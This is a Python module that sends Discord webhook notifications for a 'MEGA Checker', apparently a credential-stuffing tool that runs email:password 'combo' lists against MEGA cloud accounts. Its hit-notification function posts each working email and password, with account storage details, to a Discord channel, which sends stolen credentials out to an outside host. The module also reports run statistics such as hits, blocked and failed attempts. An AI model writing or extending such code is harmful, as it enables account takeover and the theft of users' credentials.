"""
Discord Webhook Module
Handles sending notifications to Discord channels
"""

from discord_webhook import DiscordWebhook
from datetime import datetime
from typing import Optional
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class DiscordNotifier:
    """Handles Discord webhook notifications"""
    
    def __init__(self, webhook_url: Optional[str] = None):
        self.webhook_url = webhook_url
        self.enabled = bool(webhook_url)
    
    def set_webhook(self, webhook_url: str):
        """Set or update webhook URL"""
        self.webhook_url = webhook_url
        self.enabled = bool(webhook_url)
    
    def send_message(self, content: str) -> bool:
        """
        Send a message to Discord webhook
        
        Args:
            content: Message content to send
            
        Returns:
            True if successful, False otherwise
        """
        if not self.enabled or not self.webhook_url:
            return False
        
        try:
            webhook = DiscordWebhook(url=self.webhook_url, content=content)
            response = webhook.execute()
            return response.status_code == 200
        except Exception as e:
            logger.error(f"Discord webhook error: {e}")
            return False
    
    def send_custom_message(self, content: str) -> bool:
        """Send a custom formatted message (alias for send_message)"""
        return self.send_message(content)
    
    def send_start_notification(self, combo_count: int, filename: str, keyword: str, threads: int):
        """Send checker start notification"""
        message = (
            f"🚀 **MEGA Checker Started**\n"
            f"📝 Combo Lines: {combo_count}\n"
            f"📁 Export Name: {filename}\n"
            f"🔍 Keyword: {keyword if keyword else 'None'}\n"
            f"🧵 Threads: {threads}\n"
            f"⏰ Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        return self.send_message(message)
    
    def send_hit_notification(self, email: str, password: str, used_space: float, 
                             total_space: float, keyword_found: bool, keyword: str, 
                             position: int, total: int):
        """Send hit notification"""
        message = (
            f"✅ **HIT FOUND**\n"
            f"📧 Email: {email}\n"
            f"🔑 Password: {password}\n"
            f"💾 Storage: {used_space}GB / {total_space}GB\n"
            f"🔍 Keyword Match: {keyword_found} ({keyword if keyword else 'N/A'})\n"
            f"📊 Position: {position}/{total}\n"
            f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        return self.send_message(message)
    
    def send_completion_notification(self, checked: int, hits: int, blocked: int, 
                                    fails: int, filename: str, keyword: str):
        """Send checker completion notification"""
        message = (
            f"🏁 **MEGA Checker Completed**\n"
            f"✅ Total Checked: {checked}\n"
            f"🎯 Hits: {hits}\n"
            f"🚫 Blocked: {blocked}\n"
            f"❌ Fails: {fails}\n"
            f"📁 Export File: {filename}\n"
            f"🔍 Keyword: {keyword if keyword else 'None'}\n"
            f"⏰ Completed: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        return self.send_message(message)
    
    def test_webhook(self) -> bool:
        """Test if webhook is working"""
        if not self.enabled:
            return False
        
        message = "✅ Webhook connection successful! MEGA Checker is ready."
        return self.send_message(message)
